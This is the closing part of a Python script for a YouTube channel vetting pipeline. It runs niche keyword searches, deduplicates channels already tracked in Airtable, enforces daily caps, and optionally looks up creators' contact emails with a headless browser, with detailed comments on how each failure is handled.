    return total_discovered, pushed_qualified + pushed_flagged, pushed_ids, True


# A NICHES entry missing any of these crashes run() with a bare KeyError
# (table_name/keywords, indexed directly in run() before run_niche() is
# even called) or run_niche() itself (min_avg_views/min_channel_age_months,
# checked there — see its docstring). Checking all four here, up front,
# means a bad config skips just that niche instead of killing the whole
# run partway through.
REQUIRED_NICHE_KEYS = ("table_name", "keywords", "min_avg_views", "min_channel_age_months")


def run(niches: dict, max_results_per_keyword: int, days_back: int) -> None:
    try:
        blocklist = fetch_blocklist()
    except BlocklistUnavailable as e:
        logger.error("ABORTING: %s", e)
        raise SystemExit(1)

    # Global (base-wide) dedupe: fetched once across every niche's table
    # before any niche runs, so a channel already tracked anywhere in the
    # base — not just in the niche currently being processed — is skipped.
    # get_existing_channel_ids() raises AirtableReadError rather than
    # returning a partial set on a mid-pagination failure (a 429 on page 7
    # of 14, say); a partial set here would make already-tracked channels
    # look fresh and get re-pushed, reverting reviewer Status/Notes (see
    # IMPORTANT 2 in the fix-wave review). Abort the whole run rather than
    # proceed on a set we can't trust, mirroring the blocklist abort above.
    globally_tracked_ids: set[str] = set()
    try:
        for niche_config in niches.values():
            if niche_config.get("table_name"):
                globally_tracked_ids |= get_existing_channel_ids(niche_config["table_name"])
    except AirtableReadError as e:
        logger.error("ABORTING: cannot establish the existing-channel-ID dedupe set (%s).", e)
        raise SystemExit(1)

    # Handles already tracked in the base's other YouTube outreach/leads/
    # influencer tables (see external_dedupe.py) — cached, so this is
    # near-instant on any run within EXTERNAL_CACHE_MAX_AGE_HOURS of the
    # last one.
    external_handles = fetch_external_handles()

    total_discovered = 0
    total_processed = 0
    # Whether ANY niche actually completed its daily-cap check this run
    # (see run_niche()'s cap_check_completed return value). An expired
    # Airtable token, or a NICHES dict where every entry is missing a
    # required key, would otherwise skip every niche and still exit 0 —
    # a daily scheduled job silently doing nothing forever. See IMPORTANT 3.
    any_cap_check_completed = False

    scraper = BrowserEmailScraper.launch() if USE_PLAYWRIGHT_STEALTH else null_scraper()
    # launch() fails SOFT — a missing Chromium binary, a missing shared
    # library, or an unimportable playwright all return an inert scraper
    # rather than raising, so the run continues with email chain step 4
    # silently doing nothing. That is the right behaviour (one email source
    # is not worth killing a run over) but it is invisible: the symptom is
    # simply fewer emails, on a metric nobody watches per-run. Say it out
    # loud instead, since "USE_PLAYWRIGHT_STEALTH is set" and "the browser
    # actually started" are different facts and only the second one matters.
    if USE_PLAYWRIGHT_STEALTH and not scraper.enabled:
        logger.warning(
            "USE_PLAYWRIGHT_STEALTH is on but the browser could not start — email "
            "chain step 4 (linked site / contact page) is doing nothing this run. "
            "On CI this usually means the 'Install Chromium for Playwright' step "
            "was skipped; locally, run: python -m playwright install chromium"
        )
    elif USE_PLAYWRIGHT_STEALTH:
        logger.info("Browser email step is live (Playwright + stealth).")

    try:
        for niche_name, niche_config in niches.items():
            missing_keys = [key for key in REQUIRED_NICHE_KEYS if key not in niche_config]
            if missing_keys:
                logger.error(
                    "Niche '%s' is missing required NICHES key(s) %s — skipping this niche "
                    "rather than crashing the whole run.",
                    niche_name, missing_keys,
                )
                continue

            discovered, processed, newly_tracked_ids, cap_check_completed = run_niche(
                niche_name,
                niche_config["table_name"],
                niche_config["keywords"],
                max_results_per_keyword,
                days_back,
                globally_tracked_ids,
                external_handles,
                blocklist,
                niche_config,
                scraper,
            )
            total_discovered += discovered
            total_processed += processed
            any_cap_check_completed = any_cap_check_completed or cap_check_completed
            # So a later niche in this same run also sees channels this one
            # just pushed, rather than only picking up prior runs' state.
            globally_tracked_ids |= newly_tracked_ids
    finally:
        scraper.close()

    quota_used = get_today_spend()
    print("\n--- Run summary ---")
    print(f"Total discovered:  {total_discovered}")
    print(f"Total processed:   {total_processed}")
    print(f"Quota used today:  {quota_used} / {DAILY_QUOTA_BUDGET}")

    if not any_cap_check_completed:
        logger.error(
            "No niche completed its daily-cap check this run — every niche was skipped for "
            "a non-cap reason (missing NICHES config, no table configured, or an unreadable "
            "Airtable count). Exiting non-zero so a scheduled run that did nothing is never "
            "reported as green."
        )
        raise SystemExit(1)


def main() -> None:
    global DAILY_QUALIFIED_CAP, DAILY_FLAGGED_CAP

    parser = argparse.ArgumentParser(description="YouTube channel vetting pipeline")
    parser.add_argument(
        "--test",
        action="store_true",
        help="Run a cheap end-to-end smoke test: 1 keyword, max_results=5, first niche only.",
    )
    parser.add_argument(
        "--daily-cap",
        type=int,
        default=None,
        help=(
            "Override both DAILY_QUALIFIED_CAP and DAILY_FLAGGED_CAP for this run, so the "
            "capping path can be tested cheaply against production Airtable without also "
            "leaving the flagged budget at its full (10/day) size."
        ),
    )
    parser.add_argument(
        "--days-back",
        type=int,
        default=DISCOVERY_DAYS_BACK,
        help="How many days back to search for videos. Defaults to DISCOVERY_DAYS_BACK "
             "(7). Pass a larger value for a one-off backlog sweep, e.g. --days-back 90.",
    )
    args = parser.parse_args()

    if args.daily_cap is not None:
        DAILY_QUALIFIED_CAP = args.daily_cap
        DAILY_FLAGGED_CAP = args.daily_cap

    if args.test:
        logger.info("Running in --test mode: 1 keyword, max_results=5, first niche only.")
        first_niche_name = next(iter(NICHES))
        first_niche = NICHES[first_niche_name]
        test_niches = {first_niche_name: {**first_niche, "keywords": first_niche["keywords"][:1]}}
        run(niches=test_niches, max_results_per_keyword=5, days_back=args.days_back)
    else:
        run(niches=NICHES, max_results_per_keyword=50, days_back=args.days_back)


if __name__ == "__main__":
    main()
